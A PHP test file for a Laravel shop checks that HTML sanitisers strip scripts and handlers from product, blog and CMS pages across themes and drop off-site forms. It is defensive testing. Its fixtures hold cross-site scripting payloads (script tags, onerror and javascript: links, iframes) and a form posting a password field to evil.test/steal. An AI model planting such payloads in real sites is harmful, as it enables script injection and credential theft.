<?php

use App\Models\{BlogPost, Page, Product};
use App\Services\ThemeService;
use Illuminate\Foundation\Testing\RefreshDatabase;

uses(RefreshDatabase::class);

const EVIL_HTML = '<h3>Zz Formatting</h3><p class="zz-keep">Zz <strong>bold</strong> <a href="https://example.test/zz">link</a></p><ul><li>Zz item</li></ul>'
    . '<script>window.zzPwned=1</script><img src="https://example.test/zz.jpg" onerror="window.zzPwned=2"><a href="javascript:zzPwned()">js</a>'
    . '<iframe src="https://example.test/zz-frame"></iframe><p style="position:fixed;inset:0" onmouseover="zzPwned()">over</p>';

function assertSanitised(string $html): void
{
    foreach (['<h3>Zz Formatting</h3>', 'class="zz-keep"', '<strong>bold</strong>', 'href="https://example.test/zz"', '<li>Zz item</li>', 'src="https://example.test/zz.jpg"'] as $kept) {
        expect($html)->toContain($kept);
    }
    foreach (['zzPwned', 'zz-frame', 'position:fixed;inset:0', 'href="javascript:'] as $removed) {
        expect($html)->not->toContain($removed);
    }
}

test('safe_html keeps formatting and removes anything executable', function () {
    assertSanitised(safe_html(EVIL_HTML));
    expect(safe_html(null))->toBe('')->and(safe_html('  '))->toBe('');
});

test('stored HTML is sanitised on every storefront page that prints it, in every theme', function (string $theme) {
    module('blog', true);
    app(ThemeService::class)->setActive($theme);
    $product = Product::factory()->create(['description' => EVIL_HTML]);
    $post = BlogPost::factory()->create(['content' => EVIL_HTML]);
    $page = Page::create(['title' => 'Zz', 'slug' => 'zz-page', 'content' => EVIL_HTML, 'template' => 'default', 'is_active' => true]);
    $wide = Page::create(['title' => 'Zz wide', 'slug' => 'zz-wide', 'content' => EVIL_HTML, 'template' => 'full-width', 'is_active' => true]);

    foreach (["/shop/{$product->slug}", "/blog/{$post->slug}", "/page/{$page->slug}", "/page/{$wide->slug}"] as $uri) {
        assertSanitised($this->get($uri)->assertOk()->getContent());
    }
})->with(['default', 'modern', 'starter']);

test('CMS pages keep same-site forms with a fresh CSRF token, and drop external ones', function () {
    $html = safe_page_html('<form action="/contact" method="POST" class="x"><input type="hidden" name="_token" value=""><input type="text" name="name" class="w-full" onfocus="evil()"><button type="submit">Send</button></form>'
        . '<form action="https://evil.test/steal" method="POST"><input name="pw"></form><form action="//evil.test" method="post"><input name="a"></form>');

    expect($html)->toContain('<form action="/contact" method="POST" class="x">')
        ->toContain('name="_token" value="' . csrf_token() . '"')
        ->toContain('class="w-full"')
        ->not->toContain('onfocus')
        ->not->toContain('evil.test');
});

test('blog posts and product descriptions never get forms', function () {
    expect(safe_html('<form action="/contact" method="POST"><input name="a"></form>'))->not->toContain('<form');
});
